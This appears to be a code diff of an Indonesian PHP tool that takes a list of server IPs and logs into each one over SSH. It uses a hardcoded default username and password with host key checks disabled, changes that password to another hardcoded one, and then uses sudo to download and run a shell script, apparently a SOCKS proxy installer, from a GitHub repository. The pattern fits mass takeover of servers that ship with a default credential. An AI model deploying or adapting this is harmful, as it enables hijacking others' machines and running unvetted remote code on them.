@@ -1,20 +1,18 @@
 <?php
-// Konfigurasi
+// Konfigurasi default
 $user = "cloudsigma";
 $old_password = "Cloud2025";
 $new_password = "Dotaja123@HHHH";
 
-// Kalau form disubmit
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ips = $_POST['ips'] ?? '';
 
     if (!empty($ips)) {
         $ip_list = explode(",", $ips);
 
-        // Header untuk realtime log
         header('Content-Type: text/html; charset=utf-8');
         echo "<pre style='background:black;color:#0f0;padding:15px;border-radius:8px;'>";
-        ob_end_flush(); // Matikan output buffering default
+        ob_end_flush();
         ob_implicit_flush(true);
 
         foreach ($ip_list as $ip) {
@@ -23,26 +21,28 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
             echo "🔹 VPS: $ip\n"; flush();
 
-            // Step 1: Ganti password
+            // STEP 1: Login pakai password lama & ganti password
+            echo "🔄 Mengganti password...\n"; flush();
             $cmd1 = "sshpass -p '$old_password' ssh -o StrictHostKeyChecking=no $user@$ip 'echo \"$user:$new_password\" | sudo chpasswd'";
             passthru($cmd1, $ret1);
 
             if ($ret1 === 0) {
-                echo "✅ Password berhasil diganti\n"; flush();
+                echo "✅ Password berhasil diganti, koneksi ditutup otomatis\n"; flush();
             } else {
                 echo "❌ Gagal ganti password\n"; flush();
                 continue;
             }
 
-            // Step 2: Jalankan script di remote
-            $remote_cmd = "nohup bash -c 'sudo bash -c \"$(curl -fsSL https://raw.githubusercontent.com/DOT-SUNDA/SOCKS/refs/heads/main/kontol.sh)\"' > /tmp/output.log 2>&1 &";
+            // STEP 2: Login ulang pakai password baru & jalankan script via sudo
+            echo "🔄 Login ulang pakai password baru...\n"; flush();
+            $remote_cmd = "echo '$new_password' | sudo -S bash -c 'wget -O gas https://raw.githubusercontent.com/DOT-SUNDA/SOCKS/refs/heads/main/kontol.sh && chmod +x gas && nohup ./gas devnull &'";
             $cmd2 = "sshpass -p '$new_password' ssh -o StrictHostKeyChecking=no $user@$ip \"$remote_cmd\"";
             passthru($cmd2, $ret2);
 
             if ($ret2 === 0) {
-                echo "✅ Script berhasil dijalankan\n"; flush();
+                echo "✅ Script berhasil dijalankan via sudo su\n"; flush();
             } else {
-                echo "❌ Gagal jalankan script\n"; flush();
+                echo "❌ Gagal jalankan script setelah login ulang\n"; flush();
             }
 
             echo "--------------------------------------\n"; flush();
